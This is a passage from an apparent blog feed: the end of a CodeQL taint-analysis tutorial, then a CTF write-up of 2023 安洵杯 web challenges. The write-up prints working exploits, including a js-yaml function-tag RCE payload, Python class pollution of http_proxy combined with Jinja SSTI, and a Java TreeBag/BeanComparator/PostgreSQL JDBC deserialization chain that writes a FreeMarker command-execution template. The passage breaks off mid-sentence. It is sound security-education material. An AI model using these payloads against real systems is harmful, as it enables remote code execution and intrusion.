method.getDeclaringType().toString() = &quot;Optional&lt;String&gt;&quot; and call1.getArgument(0).getType().toString() = &quot;Optional&lt;String&gt;&quot;  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  VulConfig() &#123; this = &quot;SqlInjectionConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">    node.getType() instanceof PrimitiveType or</span><br><span class="line">    node.getType() instanceof BoxedType or</span><br><span class="line">    node.getType() instanceof NumberType or</span><br><span class="line">    exists(ParameterizedType pt| node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists(Method method, MethodAccess call |</span><br><span class="line">      method.hasName(&quot;query&quot;)</span><br><span class="line">      and</span><br><span class="line">      call.getMethod() = method and</span><br><span class="line">      sink.asExpr() = call.getArgument(0)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) &#123;</span><br><span class="line">    isTaintedString(node1.asExpr(), node2.asExpr())</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><p>注：以上我们实现了一个<code>isTaintedString</code>谓词，并使用exists子查询的方式实现了强制把<code>Optional&lt;String&gt; username</code>关联<code>Optional&lt;String&gt; username.get()</code>。<br>最终，我们的这个注入被跑了出来。</p><p><img src="../images/image-20231229170116821.png" alt="image-20231229170116821"></p><p>其实这个node跟下断点调试一样   一直跟着这个username来走  很详细</p><h2 id="CodeQL进阶查询"><a href="#CodeQL进阶查询" class="headerlink" title="CodeQL进阶查询"></a>CodeQL进阶查询</h2><h3 id="递归问题"><a href="#递归问题" class="headerlink" title="递归问题"></a>递归问题</h3><p>递归调用可以帮助我们解决一类问题：就是我们不确定这个方法我们需要调用多少次才能得到我们的结果，这个时候我们就可以用递归调用。</p><p><strong>CodeQL里面的递归调用语法是：在谓词方法的后面跟*或者+，来表示调用0次以上和1次以上（和正则类似），0次会打印自己。</strong><br>我们举一个例子：</p><p>在Java语言里，我们可以使用class嵌套class，多个内嵌class的时候，我们需要知道最外层的class是什么怎么办？<br>比如如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public class StudentService &#123;</span><br><span class="line"> </span><br><span class="line">    class innerOne &#123;</span><br><span class="line">        public innerOne()&#123;&#125;</span><br><span class="line"> </span><br><span class="line">        class innerTwo &#123;</span><br><span class="line">            public innerTwo()&#123;&#125;</span><br><span class="line"> </span><br><span class="line">            public String Nihao() &#123;</span><br><span class="line">                return &quot;Nihao&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        public String Hi()&#123;</span><br><span class="line">            return &quot;hello&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照非递归的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Class classes</span><br><span class="line">where classes.getName().toString() = &quot;innerTwo&quot;</span><br><span class="line">select classes.getEnclosingType().getEnclosingType()   // getEnclosingtype获取作用域</span><br></pre></td></tr></table></figure><p>使用递归的方法</p><p>我们在调用方法后面<strong>加*(从本身开始调用)或者+(从上一级开始调用)</strong>，来解决此问题。</p><p>(就是如开头所说  在谓词方法后面加上就行)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from Class classes</span><br><span class="line">where classes.getName().toString() = &quot;innerTwo&quot;</span><br><span class="line">select classes.getEnclosingType+()   // 获取作用域</span><br></pre></td></tr></table></figure><p>我们也可以自己封装方法来递归调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">RefType demo(Class classes) &#123;</span><br><span class="line">    result = classes.getEnclosingType()</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">from Class classes</span><br><span class="line">where classes.getName().toString() = &quot;innerTwo&quot;</span><br><span class="line">select demo*(classes)   // 获取作用域</span><br></pre></td></tr></table></figure><h3 id="强制类型转换问题"><a href="#强制类型转换问题" class="headerlink" title="强制类型转换问题"></a>强制类型转换问题</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Parameter param</span><br><span class="line">select param, param.getType()</span><br></pre></td></tr></table></figure><p>getType()目的就是获取项目中所有的参数的type信息。</p><p>以上代码的含义是打印所有方法参数的名称和类型。</p><p><img src="../images/image-20231229173522680.png" alt="image-20231229173522680"></p><p>如果我们进行强制类型转化呢  <strong>(简单的说就是把不符合的类型给过滤掉  留下符合的类型)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Parameter param</span><br><span class="line">select param, param.getType().(RefType)</span><br></pre></td></tr></table></figure><p>强制转换成RefType，意思就是从前面的结果当中过滤出RefType类型的参数。RefType是什么？引用类型，说白了就是<strong>去掉int等基础类型之后的数据。</strong></p><p><img src="../images/image-20231229173732428.png" alt="image-20231229173732428"></p><p>相比之前确实变少了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Parameter param</span><br><span class="line">select param, param.getType().(IntegralType)</span><br></pre></td></tr></table></figure><p>这是保留所有数字型的参数</p><p><img src="../images/image-20231229173907492.png" alt="image-20231229173907492"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articles/web/283795.html&quot;&gt;https://www.freebuf.com/articles/web/283795.html&lt;/a&gt;  (主要参考)&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;h</summary>
      
    
    
    
    
    <category term="CodeQL" scheme="https://ke1nys.github.io/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>2023-安洵杯-web</title>
    <link href="https://ke1nys.github.io/posts/edb454bf.html"/>
    <id>https://ke1nys.github.io/posts/edb454bf.html</id>
    <published>2023-12-28T07:56:36.000Z</published>
    <updated>2024-01-20T15:32:19.398Z</updated>
    
    <content type="html"><![CDATA[<p>复现一下安洵的题目 这里就挑几道来复现就行了  复现地址的话在安洵平台上就可以</p><p><a href="https://dce.i-soon.net/#/topicBank">https://dce.i-soon.net/#/topicBank</a></p><p>直接访问就行了</p><h2 id="signal"><a href="#signal" class="headerlink" title="signal"></a>signal</h2><p>题目给了附件</p><p>⾸先这个题因为是把其他⽂件格式转换为yaml格式然后<code>yaml.load()</code>会加载为js对象</p><p><img src="../images/image-20231228160912485.png" alt="image-20231228160912485"></p><p>然后就去查这个<code>js-yaml</code>是否存在漏洞 啥的</p><p><img src="../images/image-20231228161524180.png" alt="image-20231228161524180"></p><p>这是默认为危险模式的最后⼀个版本，该模式允许您使⽤ tag 构造任意 JS 函数。!!js/function</p><p>直接去搜索<code>js-yaml RCE</code>  也能搜索到类似的文章</p><p><a href="https://nealpoole.com/blog/2013/06/code-execution-via-yaml-in-js-yaml-nodejs-module/">https://nealpoole.com/blog/2013/06/code-execution-via-yaml-in-js-yaml-nodejs-module/</a></p><p><img src="../images/image-20231228161658733.png" alt="image-20231228161658733"></p><p>最终payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;name&quot; : &#123; toString: !!js/function &quot;function()&#123; flag = process.mainModule.r</span><br><span class="line">equire(&#x27;child_process&#x27;).execSync(&#x27;cat /fla*&#x27;).toString(); return flag;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231228162001138.png" alt="image-20231228162001138">    </p><h2 id="Swagger-docs"><a href="#Swagger-docs" class="headerlink" title="Swagger docs"></a>Swagger docs</h2><p>这个题是比较值得记录的 </p><p><strong>(这个是在设置http_proxy后  然后可以伪造返回信息的  记录学习一下)</strong></p><p><img src="../images/image-20231228162830748.png" alt="image-20231228162830748"></p><p>访问给了挺多api接口的   在<code>/api-base/v0/search</code>这个接口处 发现存在任意文件读取</p><p><img src="../images/image-20231228163029766.png" alt="image-20231228163029766"></p><p>读取启动进程</p><p>然后将源码下载下来后进行审计</p><p>在update接口能 是存在一个python的原型链污染  熟悉的话应该能直接看出了</p><p><img src="../images/image-20231228163201826.png" alt="image-20231228163201826"></p><p>在search接口的话是存在这个模板渲染的</p><p><img src="../images/image-20231228163251241.png" alt="image-20231228163251241"></p><p>但是data不可控 因为他是访问服务器本地的api接口来获取文件</p><p><img src="../images/image-20231228163338058.png" alt="image-20231228163338058"></p><p>所以我们想控制返回内容来进行模板渲染的话  我们可以污染环境变量<code>http_proxy</code>  来使自己的服务器来当作代理服务器  从而控制返回内容<strong>(就是类似于中间人攻击)</strong></p><p>python原型链污染</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"> &quot;__init__&quot;: &#123;</span><br><span class="line"> &quot;__globals__&quot;: &#123;</span><br><span class="line"> &quot;os&quot;: &#123;</span><br><span class="line"> &quot;environ&quot;: &#123;</span><br><span class="line"> &quot;http_proxy&quot;:&quot;ip:port&quot;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20231228163625504.png" alt="image-20231228163625504"></p><p>然后随便发送一个请求  <code>if request.args.get(&#39;type&#39;) == &quot;text&quot;:</code>  type必须为text  不然不会进到模板渲染里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;cat EY6zl0isBvAWZFxZMvCCCTS3VRVMvoNi_FLAG&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231228163842734.png" alt="image-20231228163842734"></p><p>这里就是我们伪造的响应包 </p><p><img src="../images/image-20231228163900423.png" alt="image-20231228163900423"></p><p>结果返回</p><h2 id="ez-java"><a href="#ez-java" class="headerlink" title="ez_java"></a>ez_java</h2><p><a href="https://boogipop.com/2023/12/24/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%20Writeup/#ezjava">https://boogipop.com/2023/12/24/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%20Writeup/#ezjava</a>  参考wp</p><p>这个题就是如何连接上CB的断链 就是找新的反序列化入口</p><p><img src="../images/image-20231228164517887.png" alt="image-20231228164517887"></p><p>给的提示</p><p><img src="../images/image-20231228164542899.png" alt="image-20231228164542899"></p><p>看下有依赖  发现是存在三个依赖  那么就是用这三个东西来组合打了</p><p><img src="../images/image-20231228164639422.png" alt="image-20231228164639422"></p><p>在看了眼黑名单  发现是把<code>jackson</code>给过滤掉了  还把cb链的1前半段和后半段触发点给加黑名单了  那么就是用<code>cb</code>链和<code>postgresql</code>组合来打了</p><p><strong>(给了docker  看了眼  jdk是高版本  那么jndi和rmi是打不了了)</strong></p><p>前半段的话是<code>PriorityQueue</code>  用不了   那么我们就得找别的能序列化 并且能触发compare方法的类了</p><p>这里的话是有 treemap和treebag符合条件(这里使用treebag来演示)</p><p><img src="../images/image-20231228165256534.png" alt="image-20231228165256534"></p><p><img src="../images/image-20231228165325399.png" alt="image-20231228165325399"></p><p>这里的map 是指的treemap的实例化对象  跟进treemap的put方法</p><p><img src="../images/image-20231228165432706.png" alt="image-20231228165432706"></p><p><img src="../images/image-20231228165448651.png" alt="image-20231228165448651"></p><p>只要控制了这个comparator这个参数  那么我们就可以完全替代<code>PriorityQueue</code>了</p><p>那么我们就剩最后一步了  就是这个getter  这里给的是这个<code>postgresql</code>  于是就猜测是打他的jdbc</p><p><img src="../images/image-20231228170624169.png" alt="image-20231228170624169"></p><p>因为题目不出网  在加上给的源码中有个index.ftl  就不难想到是写入文件覆盖掉index.ftl里的内容</p><p>加上前面题目提示的BaseDataSource类  里面刚好是有个getconnection方法  于是链子就构造完成了</p><p><img src="../images/image-20231228170819795.png" alt="image-20231228170819795"></p><p>最终POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.axb;</span><br><span class="line"></span><br><span class="line"><span class="comment">//import com.google.gson.Gson;</span></span><br><span class="line"><span class="keyword">import</span> com.javasec.utils.SerializeUtils;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.bag.TreeBag;</span><br><span class="line"><span class="keyword">import</span> org.postgresql.ds.PGConnectionPoolDataSource;</span><br><span class="line"><span class="comment">//import org.apache.commons.collections.comparators.BooleanComparator;</span></span><br><span class="line"><span class="comment">//import org.apache.commons.collections.comparators.ComparableComparator;</span></span><br><span class="line"><span class="comment">//import org.apache.commons.collections.keyvalue.TiedMapEntry;</span></span><br><span class="line"><span class="comment">//import org.apache.commons.collections.map.LazyMap;</span></span><br><span class="line"><span class="comment">//import org.apache.commons.collections4.comparators.TransformingComparator;</span></span><br><span class="line"><span class="comment">//import org.apache.commons.collections.functors.ConstantTransformer;</span></span><br><span class="line"><span class="comment">//import org.apache.commons.collections4.Transformer;</span></span><br><span class="line"><span class="comment">//import org.apache.commons.collections4.functors.InvokerTransformer;</span></span><br><span class="line"><span class="comment">//import org.junit.Test;</span></span><br><span class="line"><span class="comment">//import org.postgresql.ds.PGConnectionPoolDataSource;</span></span><br><span class="line"><span class="comment">//import org.springframework.context.support.ClassPathXmlApplicationContext;</span></span><br><span class="line"><span class="comment">//import org.springframework.context.support.FileSystemXmlApplicationContext;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//    public void test() throws Exception &#123;</span></span><br><span class="line"><span class="comment">//        PGConnectionPoolDataSource pgConnectionPoolDataSource = new PGConnectionPoolDataSource();</span></span><br><span class="line"><span class="comment">//        String loggerLevel = &quot;debug&quot;;</span></span><br><span class="line"><span class="comment">//        String loggerFile = &quot;/app/templates/index.ftl&quot;;</span></span><br><span class="line"><span class="comment">//        String shellContent=&quot;&lt;#assign ac=springMacroRequestContext.webApplicationContext&gt;\n&quot;+&quot;&lt;#assign fc=ac.getBean(&#x27;freeMarkerConfiguration&#x27;)&gt;\n&quot;+&quot;&lt;#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;\n&quot;+&quot;&lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;/$&#123;\&quot;freemarker.template.utility.Execute\&quot;?new()(\&quot;cat /flag\&quot;)&#125;&quot;;</span></span><br><span class="line"><span class="comment">//        System.out.println(shellContent);</span></span><br><span class="line"><span class="comment">//        String jdbcUrl = &quot;jdbc:postgresql://&quot;+&quot;123&quot;+&quot;/aaaa?ApplicationName=&quot;+&quot;123123123&quot;+&quot;&amp;loggerFile=&quot;+loggerFile+&quot;&amp;loggerLevel=&quot;+loggerLevel;</span></span><br><span class="line"><span class="comment">//        pgConnectionPoolDataSource.setURL(jdbcUrl);</span></span><br><span class="line"><span class="comment">//        pgConnectionPoolDataSource.setServerNames(new String[]&#123;shellContent&#125;);</span></span><br><span class="line"><span class="comment">//        BeanComparator comparator = new BeanComparator();</span></span><br><span class="line"><span class="comment">//        SerializeUtils.setFieldValue(comparator, &quot;property&quot;, &quot;connection&quot;);</span></span><br><span class="line"><span class="comment">//        TreeBag treeBag = new TreeBag(comparator);</span></span><br><span class="line"><span class="comment">//        TreeMap&lt;Object,Object&gt; m = new TreeMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        SerializeUtils.setFieldValue(m, &quot;size&quot;, 2);</span></span><br><span class="line"><span class="comment">//        SerializeUtils.setFieldValue(m, &quot;modCount&quot;, 2);</span></span><br><span class="line"><span class="comment">//        Class&lt;?&gt; nodeC = Class.forName(&quot;java.util.TreeMap$Entry&quot;);</span></span><br><span class="line"><span class="comment">//        Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);</span></span><br><span class="line"><span class="comment">//        nodeCons.setAccessible(true);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        Object MutableInteger = SerializeUtils.createWithoutConstructor(&quot;org.apache.commons.collections.bag.AbstractMapBag$MutableInteger&quot;);</span></span><br><span class="line"><span class="comment">//        Object node = nodeCons.newInstance(pgConnectionPoolDataSource,MutableInteger, null);</span></span><br><span class="line"><span class="comment">//        Object right = nodeCons.newInstance(pgConnectionPoolDataSource, MutableInteger, node);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        SerializeUtils.setFieldValue(node, &quot;right&quot;, right);</span></span><br><span class="line"><span class="comment">//        SerializeUtils.setFieldValue(m, &quot;root&quot;, node);</span></span><br><span class="line"><span class="comment">//        SerializeUtils.setFieldValue(m, &quot;comparator&quot;, comparator);</span></span><br><span class="line"><span class="comment">//        SerializeUtils.setFieldValue(treeBag,&quot;map&quot;,m);</span></span><br><span class="line"><span class="comment">//        System.out.println(SerializeUtils.base64serial(treeBag));</span></span><br><span class="line"><span class="comment">//        SerializeUtils.deserTester(treeBag);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">PGConnectionPoolDataSource</span> <span class="variable">pgConnectionPoolDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PGConnectionPoolDataSource</span>();</span><br><span class="line">            <span class="type">String</span> <span class="variable">loggerLevel</span> <span class="operator">=</span> <span class="string">&quot;debug&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">loggerFile</span> <span class="operator">=</span> <span class="string">&quot;/app/templates/index.ftl&quot;</span>;</span><br><span class="line">            String shellContent=<span class="string">&quot;&lt;#assign ac=springMacroRequestContext.webApplicationContext&gt;\n&quot;</span>+<span class="string">&quot;&lt;#assign fc=ac.getBean(&#x27;freeMarkerConfiguration&#x27;)&gt;\n&quot;</span>+<span class="string">&quot;&lt;#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;\n&quot;</span>+<span class="string">&quot;&lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;/$&#123;\&quot;freemarker.template.utility.Execute\&quot;?new()(\&quot;cat /flag\&quot;)&#125;&quot;</span>;</span><br><span class="line">            System.out.println(shellContent);</span><br><span class="line">            <span class="type">String</span> <span class="variable">jdbcUrl</span> <span class="operator">=</span> <span class="string">&quot;jdbc:postgresql://&quot;</span>+<span class="string">&quot;47.108.206.43:39201&quot;</span>+<span class="string">&quot;/aaaa?ApplicationName=&quot;</span>+<span class="string">&quot;123123123&quot;</span>+<span class="string">&quot;&amp;loggerFile=&quot;</span>+loggerFile+<span class="string">&quot;&amp;loggerLevel=&quot;</span>+loggerLevel;</span><br><span class="line">            pgConnectionPoolDataSource.setURL(jdbcUrl);</span><br><span class="line">            pgConnectionPoolDataSource.setServerNames(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;shellContent&#125;);</span><br><span class="line">            <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">            SerializeUtils.setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;connection&quot;</span>);</span><br><span class="line">            <span class="type">TreeBag</span> <span class="variable">treeBag</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeBag</span>(comparator);</span><br><span class="line">            TreeMap&lt;Object,Object&gt; m = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">            SerializeUtils.setFieldValue(m, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">            SerializeUtils.setFieldValue(m, <span class="string">&quot;modCount&quot;</span>, <span class="number">2</span>);</span><br><span class="line">            Class&lt;?&gt; nodeC = Class.forName(<span class="string">&quot;java.util.TreeMap$Entry&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">nodeCons</span> <span class="operator">=</span> nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);</span><br><span class="line">            nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">Object</span> <span class="variable">MutableInteger</span> <span class="operator">=</span> SerializeUtils.createWithoutConstructor(<span class="string">&quot;org.apache.commons.collections.bag.AbstractMapBag$MutableInteger&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> nodeCons.newInstance(pgConnectionPoolDataSource,MutableInteger, <span class="literal">null</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">right</span> <span class="operator">=</span> nodeCons.newInstance(pgConnectionPoolDataSource, MutableInteger, node);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            SerializeUtils.setFieldValue(node, <span class="string">&quot;right&quot;</span>, right);</span><br><span class="line">            SerializeUtils.setFieldValue(m, <span class="string">&quot;root&quot;</span>, node);</span><br><span class="line">            SerializeUtils.setFieldValue(m, <span class="string">&quot;comparator&quot;</span>, comparator);</span><br><span class="line">            SerializeUtils.setFieldValue(treeBag,<span class="string">&quot;map&quot;</span>,m);</span><br><span class="line">            System.out.println(SerializeUtils.base64serial(treeBag));</span><br><span class="line">            SerializeUtils.deserTester(treeBag);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里话解释上述代码中几个段的问题</p><p><img src="../images/image-20231228171546089.png" alt="image-20231228171546089"></p><p>这里话就是实例化TreeMap类中的内部类Entry类  这个类的话是因为内部类  所以需要反射来进行实例化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object MutableInteger = SerializeUtils.createWithoutConstructor(&quot;org.apache.commons.collections.bag.AbstractMapBag$MutableInteger&quot;);</span><br></pre></td></tr></table></figure><p>这一步是对内部类的反射实例化  (只不过因为这个是protected  所以用这个createWithoutConstructor方法来实例化)</p><p><img src="../images/image-20231228172001962.png" alt="image-20231228172001962"></p><p><img src="../images/image-20231228172910035.png" alt="image-20231228172910035"></p><p>这两行的话就是给上面刚刚实例化的Entry内部类的构造函数进行赋值</p><p><img src="../images/image-20231228172957366.png" alt="image-20231228172957366"></p><p><img src="../images/image-20231228174300711.png" alt="image-20231228174300711"></p><h2 id="ai-java"><a href="#ai-java" class="headerlink" title="ai_java"></a>ai_java</h2><p>这个题就是SerializedData + LDAP攻击  然后打fastjson </p><p><a 